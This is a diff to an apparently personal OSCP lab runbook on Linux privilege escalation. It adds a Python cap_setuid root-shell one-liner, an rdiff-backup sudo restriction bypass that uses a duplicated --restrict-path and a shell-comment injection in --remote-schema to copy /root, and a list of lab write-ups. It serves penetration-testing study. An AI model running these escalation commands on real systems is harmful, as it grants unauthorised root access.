@@ -281,6 +281,23 @@ gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
 
 ---
 
+### Versioned Python interpreter with cap_setuid
+
+Cap confirms that the useful capability may be attached to a versioned interpreter rather than the generic command name. Confirm the exact path and prove the UID transition without modifying the binary.
+
+~~~bash
+getcap /usr/bin/python3.8
+/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+id
+whoami
+~~~
+
+CAP_SETUID changes the process UID, so the group ID can remain the original user’s group. The complete id output is the proof. Do not assume CAP_NET_BIND_SERVICE or CAP_NET_RAW has the same impact.
+
+See [[OSCP/RUNBOOK V2/Linux - File Capabilities|Linux - File Capabilities]] and [[OSCP/BOXES/WRITE UPS/Linux/Cap|Cap]].
+
+---
+
 ## Sudo Abuse (Module 18.4.2)
 
 ```bash
@@ -863,7 +880,25 @@ id
 whoami
 ~~~
 
-Perl's exec function replaces the interpreter process, while the identity granted by sudo remains in effect. Use the exact path shown by sudo -l and confirm the result with id. See [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]] and [[RUNBOOK V2/Linux - Sudo Check|Linux - Sudo Check]].
+Perl's exec function replaces the interpreter process, while the identity granted by sudo remains in effect. Use the exact path shown by sudo -l and confirm the result with id. See [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]] and [[OSCP/RUNBOOK V2/Linux - Sudo Check|Linux - Sudo Check]].
+
+## rdiff-backup sudo wildcard restriction injection
+
+When `sudo -l` permits a root rdiff-backup server with a trailing wildcard, inspect duplicate restriction behavior before treating `--restrict-path` as an effective boundary. First test parser acceptance, then use the local rdiff protocol and request only the evidence needed.
+
+~~~bash
+sudo -n -l
+
+sudo -n /usr/bin/rdiff-backup --server \
+  --restrict-path /opt/backup --restrict-mode read-only \
+  --restrict-path / --version
+
+rdiff-backup \
+  --remote-schema "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path / #{h}" \
+  backup localhost::/root "$BoxDir/loot/rdiff-root"
+~~~
+
+`--remote-schema` needs `{h}` for rdiff-backup v2 validation. `#{h}` satisfies that check while the shell comment prevents a second connection. Test the permitted path first and use an immediate protocol bridge when forwarding small messages; a buffered bridge can hang. See [[OSCP/RUNBOOK V2/Linux - Rdiff-Backup Sudo Abuse|Linux - Rdiff-Backup Sudo Abuse]] and [[OSCP/BOXES/WRITE UPS/Linux/Management|Management]].
 
 ## External Resources
 
@@ -883,11 +918,25 @@ This page turns one repeatable part of an authorized assessment into a checklist
 ## Demonstrated in box write-ups
 
 - [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- demonstrates the workflow described here
+- [[OSCP/BOXES/WRITE UPS/Linux/CronOS|CronOS]] -- writable root-run Laravel scheduler script after a web foothold
+- [[OSCP/BOXES/WRITE UPS/Linux/OpenAdmin|OpenAdmin]] -- passwordless `sudo nano` editor escape after SSH credential recovery
+- [[OSCP/BOXES/WRITE UPS/Linux/clamAV|clamAV]] -- legacy Sendmail/milter exploit produced a direct root shell, so no local privesc was needed
 - [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- user cron filename injection and sudo-generated configuration parsing
 - [[OSCP/BOXES/WRITE UPS/Linux/Covfefe|Covfefe]] -- custom SUID source review and adjacent-string privilege escalation
 - [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce|TartarSauce]] -- `sudo tar` checkpoint execution, systemd timer inspection, and archive replacement with an architecture-matched SUID helper
 - [[OSCP/BOXES/WRITE UPS/Linux/Traceback|Traceback]] -- Luvit `os.execute()` run-as pivot, group-writable MOTD script, SSH trigger, and SUID Bash `-p`
 - [[OSCP/BOXES/WRITE UPS/Linux/Blocky|Blocky]] -- password reuse followed by a direct unrestricted sudo boundary
+- [[OSCP/BOXES/WRITE UPS/Linux/Bashed|Bashed]] -- sudo run-as transition, writable root cron script, and SUID Bash proof
+- [[OSCP/BOXES/WRITE UPS/Linux/Cap|Cap]] -- versioned Python `cap_setuid` capability converted directly into UID 0
+- [[OSCP/BOXES/WRITE UPS/Linux/Cockpit|Cockpit]] -- `sudo tar *` checkpoint-action wildcard abuse
+- [[OSCP/BOXES/WRITE UPS/Linux/Management|Management]] -- duplicate rdiff-backup restriction argument used through a read-only protocol
+- [[OSCP/BOXES/WRITE UPS/Linux/Jarvis|Jarvis]] -- SUID `systemctl` editor path created a SUID Bash helper
+- [[OSCP/BOXES/WRITE UPS/Linux/Nukem|Nukem]] -- SUID DOSBox used to write a controlled sudoers rule
+- [[OSCP/BOXES/WRITE UPS/Linux/Payday|Payday]] -- unrestricted sudo was validated before using `sudo su`
+- [[OSCP/BOXES/WRITE UPS/Linux/Pelican|Pelican]] -- sudo `gcore` exposed a root-process credential in memory
+- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- owner-writable `/etc/passwd` converted recovered access into root
+- [[OSCP/BOXES/WRITE UPS/Linux/SolidState|SolidState]] -- restricted-shell behavior was assessed before returning to the credential and file-write branches
+- [[OSCP/BOXES/WRITE UPS/Linux/SwagShop|SwagShop]] -- exact passwordless Vim rule converted an editor boundary into a root shell
 
 ## TartarSauce: tar, systemd timer, and archive trust boundary
 
